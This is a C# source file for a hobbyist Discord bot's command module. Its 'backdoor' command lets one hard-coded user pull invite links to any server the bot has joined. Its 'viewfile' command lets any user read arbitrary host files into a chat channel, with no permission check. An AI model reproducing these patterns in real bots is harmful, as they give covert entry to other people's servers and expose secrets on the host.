using System;
using System.Collections.Generic;
using System.Text;
using System.Linq;
using System.Threading.Tasks;

using Discord;
using Discord.Commands;
using Discord.WebSocket;
using System.IO;
using System.Net;
using Newtonsoft.Json;
using System.Runtime.Serialization;
using Newtonsoft.Json.Linq;
using System.Diagnostics;

namespace ConsoleApp1.Core.Moderation
{
    public class Backdoor : ModuleBase<SocketCommandContext>
    {
        [Command("backdoor"), Summary("Get the invite of a server")]
        public async Task BackdoorModule(ulong GuildID = 0)
        {
            Console.Write($"[" + DateTime.Now + $" at Commands] ");
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.Write($"{Context.Message.Author.Username}#{Context.Message.Author.Discriminator}");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.Write(" used command skap!backdoor\n");
            
            string logCommand = ($"[" + DateTime.Now + $" at Commands] {Context.Message.Author.Username}#{Context.Message.Author.Discriminator} used command skap!backdoor {GuildID.ToString()}");
            Program.CommandsLog(logCommand);

            if (!(Context.User.Id == 365205975705190400))
            {
                await Context.Channel.SendMessageAsync(":x: You are not a bot moderator!");
                return;
            }

            if (Context.Client.Guilds.Where(x => x.Id == GuildID).Count() < 1)
            {
                await Context.Channel.SendMessageAsync(":x: I am not in a guild with id: " + GuildID);
                return;
            }

            SocketGuild Guild = Context.Client.Guilds.Where(x => x.Id == GuildID).FirstOrDefault();
            Random rand = new Random();

            var Invites = await Guild.GetInvitesAsync();
            if (Invites.Count() < 1)
            {
                try
                {
                    await Guild.TextChannels.First().CreateInviteAsync();
                }
                catch (Exception ex)
                {
                    await Context.Channel.SendMessageAsync($":x: Creating an invite for guild {Guild.Name} went wrong with error ``{ex.Message}``.");
                    return;
                }
            }

            Invites = null;
            Invites = await Guild.GetInvitesAsync();
            EmbedBuilder Embed = new EmbedBuilder();
            Embed.WithAuthor($"Invites for guild {Guild.Name}:", Guild.IconUrl);
            Embed.WithColor(rand.Next(255), rand.Next(255), rand.Next(255));
            foreach (var Current in Invites)
                Embed.AddInlineField("Invite:", $"[Invite]({Current.Url})");

            await Context.Channel.SendMessageAsync("", false, Embed.Build());
        }

        [Command("customgame"), Alias("cg"), Summary("Custom game moderation command")]
        public async Task CustomGame([Remainder]string game = null)
        {
            Console.Write($"[" + DateTime.Now + $" at Commands] ");
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.Write($"{Context.Message.Author.Username}#{Context.Message.Author.Discriminator}");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.Write(" used command skap!customgame\n");

            string logCommand = ($"[" + DateTime.Now + $" at Commands] {Context.Message.Author.Username}#{Context.Message.Author.Discriminator} used command skap!customgame {game}");
            Program.CommandsLog(logCommand);

            if (game == null)
            {
                await Context.Channel.SendMessageAsync(":x: You Didn't entered a game! Try again");
                return;
            }

            if (!(Context.User.Id == 365205975705190400))
            {
                await Context.Channel.SendMessageAsync(":x: You are not a bot moderator!");
                return;
            }

            if (!(Context.Guild.Id == 432606258290491403))
            {
                await Context.Channel.SendMessageAsync(":x: This is not an owner's guild!");
                return;
            }

            await Context.Client.SetGameAsync(game);
        }

        [Command("viewfile"), Alias("vf"), Summary("File viewer")]
        public async Task ViewFile([Remainder]string filename = null)
        {
            Console.Write($"[" + DateTime.Now + $" at Commands] ");
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.Write($"{Context.Message.Author.Username}#{Context.Message.Author.Discriminator}");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.Write(" used command skap!viewfile\n");

            string logCommand = ($"[" + DateTime.Now + $" at Commands] {Context.Message.Author.Username}#{Context.Message.Author.Discriminator} used command skap!viewfile {filename}");
            Program.CommandsLog(logCommand);

            if (filename == null)
            {
                await Context.Channel.SendMessageAsync(":x: No file name!");
            }
            else
            {
                if (File.Exists(filename))
                {
                    string text = "";

                    StreamReader reader = new StreamReader(filename);
                    text = reader.ReadToEnd();
                    reader.Close();

                    await Context.Channel.SendMessageAsync("Here's your file:\n\n" + text);
                }
                else
                {
                    await Context.Channel.SendMessageAsync(":x: File not found!");
                }
            }
        }

        [Command("fileinfo"), Alias("fi"), Summary("Get file info(length)")]
        public async Task FileInfo([Remainder]string filename = null)
        {
            Console.Write($"[" + DateTime.Now + $" at Commands] ");
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.Write($"{Context.Message.Author.Username}#{Context.Message.Author.Discriminator}");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.Write(" used command skap!fileinfo\n");

            string logCommand = ($"[" + DateTime.Now + $" at Commands] {Context.Message.Author.Username}#{Context.Message.Author.Discriminator} used command skap!fileinfo {filename}");
            Program.CommandsLog(logCommand);

            if (filename == null)
            {
                await Context.Channel.SendMessageAsync(":x: No file name!");
            }
            else
            {
                if (File.Exists(filename))
                {
                    string text = "";

                    StreamReader reader = new StreamReader(filename);
                    text = reader.ReadToEnd();
                    reader.Close();

                    await Context.Channel.SendMessageAsync("Total length: " + text.Length);
                }
                else
                {
                    await Context.Channel.SendMessageAsync(":x: File not found!");
                }
            }
        }

        [Command("stats"), Summary("Bot stats")]
        public async Task Stats()
        {
            Console.Write($"[" + DateTime.Now + $" at Commands] ");
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.Write($"{Context.Message.Author.Username}#{Context.Message.Author.Discriminator}");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.Write(" used command skap!stats\n");

            string logCommand = ($"[" + DateTime.Now + $" at Commands] {Context.Message.Author.Username}#{Context.Message.Author.Discriminator} used command skap!stats");
            Program.CommandsLog(logCommand);

            float worSet = Environment.WorkingSet;

            await Context.Channel.SendMessageAsync("Total commands seen since start: " + Program.commands +
                                                 "\nTotal messages seen since start: " + Program.messages +
                                                $"\nWorking set: {worSet.ToString("#")} Bytes alias {(worSet / 1024 / 1024).ToString("#.##")} MegaBytes");
        }

        [Command("restart"), Summary("Restart command")]
        public async Task Restart()
        {
            Console.Write($"[" + DateTime.Now + $" at Commands] ");
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.Write($"{Context.Message.Author.Username}#{Context.Message.Author.Discriminator}");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.Write(" used command skap!restart\n");

            string logCommand = ($"[" + DateTime.Now + $" at Commands] {Context.Message.Author.Username}#{Context.Message.Author.Discriminator} used command skap!restart");
            Program.CommandsLog(logCommand);
            try
            {
                Process.Start("NewBot.bat");
                Environment.Exit(0);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }



        [Command("test"), Summary("Testing command")]
        public async Task Test()
        {
            Console.Write($"[" + DateTime.Now + $" at Commands] ");
            Console.ForegroundColor = ConsoleColor.DarkGreen;
            Console.Write($"{Context.Message.Author.Username}#{Context.Message.Author.Discriminator}");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.Write(" used command skap!test\n");

            string logCommand = ($"[" + DateTime.Now + $" at Commands] {Context.Message.Author.Username}#{Context.Message.Author.Discriminator} used command skap!test");
            Program.CommandsLog(logCommand);

            #region Start
            /*var channel2 = Context.Client.GetChannel(466266850716680223);

            var server = Context.Client.GetGuild(432606258290491403);
            var channel = server.GetChannel(466266850716680223);*/

            /*
            string test = "";

            if (File.Exists("Test.txt"))
            {
                StreamReader reader = new StreamReader("Test.txt");
                test = reader.ReadToEnd();
                reader.Close();
            }
            else
            {
                StreamWriter writer = new StreamWriter("Test.txt");
                writer.Write("");
                writer.Close();
            }
            
            if (!test.Contains("hallo"))
            {
                test = test + "hallo";
                Console.WriteLine("added hallo");

                StreamWriter writer1 = new StreamWriter("Test.txt");
                writer1.WriteLine(test);
                writer1.Close();
            }
            else
            {
                Console.WriteLine("Contains hallo");
            }*/

            /*
            #region Getting mur image
            //Get new mur image
            string apiUrl = "https://sheri.bot/api/v2/mur";
            Uri address = new Uri(apiUrl);

            // Create the web request
            HttpWebRequest request = WebRequest.Create(address) as HttpWebRequest;

            // Set type to POST 
            request.Method = "GET";
            request.ContentType = "text/json";

            string strOutputJson = "";

            using (HttpWebResponse response = request.GetResponse() as HttpWebResponse)
            {
                // Get the response stream 
                StreamReader reader = new StreamReader(response.GetResponseStream());

                // Console application output 
                strOutputJson = reader.ReadToEnd();
            }
            #endregion
            */

            //await Context.Channel.SendMessageAsync(strOutputJson);
            //Console.WriteLine(strOutputJson);

            /*try
            {
                string jsontext = "{\"url\":\"https://cdn.sheri.bot/mur/B0127.jpg\",\"author\":{ \"name\":null,\"link\":null},\"source\":null,\"tags\":[]}";

                dynamic obj = JsonConvert.SerializeObject(jsontext);

                Console.WriteLine(obj);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }*/
            #endregion

            //List<Dictionary<string, string>> obj = JsonConvert.DeserializeObject<List<Dictionary<string, string>>>(jsontext);

            try
            {
                #region wtf
                //JObject jedit1 = JObject.Parse(jsource[0]);

                //string jedit2 = jedit1.ToString();

                //Console.WriteLine(jsonedit2);

                //Easier getting
                /*using (WebClient webClient = new System.Net.WebClient())
                {
                    WebClient n = new WebClient();
                    var json = n.DownloadString("https://sheri.bot/api/v2/mur");
                    string valueOriginal = Convert.ToString(json);
                }*/

                //JArray jArray = JArray.Parse(jsource[0]);

                //string gg = jArray[0]["url"].Value<string>();

                //object obj = jArray[0]["url"].Value<string>();

                //Console.WriteLine(obj);

                //var values = (JArray)jObj2["url"];

                //JArray arr = (JArray)jObj2.SelectToken("url");
                #endregion

                string valueOriginal = "";

                using (WebClient webClient = new System.Net.WebClient())
                {
                    WebClient n = new WebClient();
                    var json = n.DownloadString("https://sheri.bot/api/v2/mur");
                    valueOriginal = Convert.ToString(json);
                }

                //string jsource = "{\"url\":\"https://cdn.sheri.bot/mur/B0127.jpg\",\"author\":{ \"name\":null,\"link\":null},\"source\":null,\"tags\":[]}";

                var jObj = valueOriginal;
                var jObj2 = JObject.Parse(jObj);
                
                string gg = jObj2.First.ToString();

                gg = gg.Replace("\"{\"url\":\"", "");
                gg = gg.Replace("\"", "");
                gg = gg.Remove(0, 4);
                await Context.Channel.SendMessageAsync(gg);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }
    }
    
    public class Mur
    {
        public string url { get; set; }
        public Author author { get; set; }
        public object source { get; set; }
        public object[] tags { get; set; }
    }

    public class Author
    {
        public object name { get; set; }
        public object link { get; set; }
    }
}
